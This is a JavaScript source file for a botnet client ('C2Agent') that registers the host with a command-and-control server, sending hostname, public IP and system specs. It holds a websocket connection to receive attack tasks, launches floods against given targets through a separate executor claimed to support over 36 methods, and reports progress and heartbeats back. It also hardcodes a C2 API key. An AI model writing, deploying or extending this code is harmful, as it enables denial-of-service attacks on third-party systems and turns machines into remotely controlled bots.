import { io } from 'socket.io-client';
import os from 'os';
import crypto from 'crypto';
import axios from 'axios';
import { methodExecutor } from './method-executor.js';
import { logger } from '../utils/logger.js';

export class C2Agent {
    constructor(config) {
        this.config = {
            c2Url: config.c2Url || 'http://localhost:8080',
            apiKey: config.apiKey || 'aryzz-c2-api-key-2024',
            reconnectInterval: config.reconnectInterval || 5000,
            heartbeatInterval: config.heartbeatInterval || 30000,
            ...config
        };

        this.botId = crypto.randomUUID();
        this.socket = null;
        this.activeAttacks = new Map();
        this.heartbeatTimer = null;
        this.connected = false;
    }

    async start() {
        try {
            // Register bot with C2 server
            await this.registerBot();
            
            // Connect WebSocket
            this.connectWebSocket();
            
            // Start heartbeat
            this.startHeartbeat();
            
            logger.success(`🤖 C2 Agent started - Bot ID: ${this.botId}`);
            logger.info(`📡 Connected to C2: ${this.config.c2Url}`);
        } catch (error) {
            logger.error('Failed to start C2 agent:', error);
            setTimeout(() => this.start(), this.config.reconnectInterval);
        }
    }

    async registerBot() {
        const botInfo = {
            id: this.botId,
            hostname: os.hostname(),
            ip: await this.getPublicIP(),
            os: `${os.type()} ${os.release()}`,
            arch: os.arch(),
            cpus: os.cpus().length,
            memory: Math.round(os.totalmem() / 1024 / 1024 / 1024), // GB
            version: '1.0.0'
        };

        try {
            const response = await axios.post(
                `${this.config.c2Url}/api/bot/register`,
                botInfo,
                {
                    headers: { 'Content-Type': 'application/json' }
                }
            );

            if (response.data.success) {
                this.botId = response.data.bot.id;
                logger.success('✅ Bot registered successfully');
            }
        } catch (error) {
            logger.error('Failed to register bot:', error.message);
            throw error;
        }
    }

    async getPublicIP() {
        try {
            const response = await axios.get('https://api.ipify.org?format=json', { timeout: 5000 });
            return response.data.ip;
        } catch (error) {
            return '0.0.0.0';
        }
    }

    connectWebSocket() {
        this.socket = io(this.config.c2Url, {
            transports: ['websocket'],
            reconnection: true,
            reconnectionDelay: this.config.reconnectInterval
        });

        this.socket.on('connect', () => {
            logger.success('🔌 WebSocket connected');
            this.connected = true;
            
            // Authenticate
            this.socket.emit('bot:connect', {
                botId: this.botId,
                apiKey: this.config.apiKey
            });
        });

        this.socket.on('connected', (data) => {
            if (data.success) {
                logger.success('✅ Authenticated with C2 server');
            }
        });

        this.socket.on('task:new', async (task) => {
            logger.info(`📥 New task received: ${task.id}`);
            await this.handleTask(task);
        });

        this.socket.on('task:stop', async (data) => {
            logger.warning(`⚠️  Stop task: ${data.taskId}`);
            await this.stopTask(data.taskId);
        });

        this.socket.on('disconnect', () => {
            logger.warning('🔌 WebSocket disconnected');
            this.connected = false;
        });

        this.socket.on('error', (error) => {
            logger.error('WebSocket error:', error);
        });
    }

    async handleTask(task) {
        try {
            if (task.type === 'attack' && task.command.action === 'start_attack') {
                await this.startAttack(task);
            } else {
                logger.warning(`Unknown task type: ${task.type}`);
            }
        } catch (error) {
            logger.error(`Failed to handle task ${task.id}:`, error);
        }
    }

    async startAttack(task) {
        const cmd = task.command;
        
        logger.info(`⚡ Starting attack: ${cmd.target} (${cmd.method})`);
        
        try {
            // Execute using method executor (supports all 36+ methods!)
            await methodExecutor.executeMethod({
                attackId: task.id,
                target: cmd.target,
                method: cmd.method,
                threads: cmd.threads,
                duration: cmd.duration,
                rpc: cmd.rpc,
                proxies: cmd.proxies || null,
                userAgents: cmd.userAgents || [],
                referers: cmd.referers || [],
                onProgress: (data) => {
                    // Send progress to C2 server
                    if (this.socket && this.socket.connected) {
                        this.socket.emit('attack:progress', {
                            attackId: task.attackId,
                            taskId: task.id,
                            progress: data.stats
                        });
                    }
                },
                onComplete: (data) => {
                    logger.success(`✅ Attack completed: ${task.id}`);
                    
                    // Report completion
                    this.completeTask(task.id, {
                        success: true,
                        stats: data.stats
                    });
                    
                    this.activeAttacks.delete(task.id);
                },
                onError: (data) => {
                    logger.error(`❌ Attack failed: ${task.id}`, data.error);
                    
                    this.completeTask(task.id, {
                        success: false,
                        error: data.error
                    });
                    
                    this.activeAttacks.delete(task.id);
                }
            });

            this.activeAttacks.set(task.id, { method: cmd.method, startTime: Date.now() });

        } catch (error) {
            logger.error(`❌ Failed to start attack: ${error.message}`);
            
            this.completeTask(task.id, {
                success: false,
                error: error.message
            });
        }
    }

    async stopTask(taskId) {
        if (this.activeAttacks.has(taskId)) {
            methodExecutor.stopAttack(taskId);
            this.activeAttacks.delete(taskId);
            logger.info(`⚠️  Task stopped: ${taskId}`);
        }
    }

    async completeTask(taskId, result) {
        try {
            await axios.post(
                `${this.config.c2Url}/api/task/${taskId}/complete`,
                result,
                {
                    headers: { 'Content-Type': 'application/json' }
                }
            );
        } catch (error) {
            logger.error('Failed to report task completion:', error.message);
        }
    }

    startHeartbeat() {
        this.heartbeatTimer = setInterval(async () => {
            if (!this.connected) return;

            try {
                const stats = {
                    cpu: os.loadavg()[0],
                    memory: {
                        total: os.totalmem(),
                        free: os.freemem(),
                        used: os.totalmem() - os.freemem()
                    },
                    uptime: os.uptime(),
                    activeAttacks: this.activeAttacks.size
                };

                await axios.post(
                    `${this.config.c2Url}/api/bot/${this.botId}/heartbeat`,
                    { stats },
                    {
                        headers: { 'Content-Type': 'application/json' }
                    }
                );

                this.socket.emit('bot:stats', stats);
            } catch (error) {
                logger.debug('Heartbeat failed:', error.message);
            }
        }, this.config.heartbeatInterval);
    }

    stop() {
        logger.info('Stopping C2 agent...');
        
        if (this.heartbeatTimer) {
            clearInterval(this.heartbeatTimer);
        }
        
        if (this.socket) {
            this.socket.disconnect();
        }
        
        // Stop all active attacks
        methodExecutor.stopAllAttacks();
        this.activeAttacks.clear();
        
        logger.success('C2 agent stopped');
    }
}

export async function startC2Agent(config) {
    const agent = new C2Agent(config);
    await agent.start();
    return agent;
}
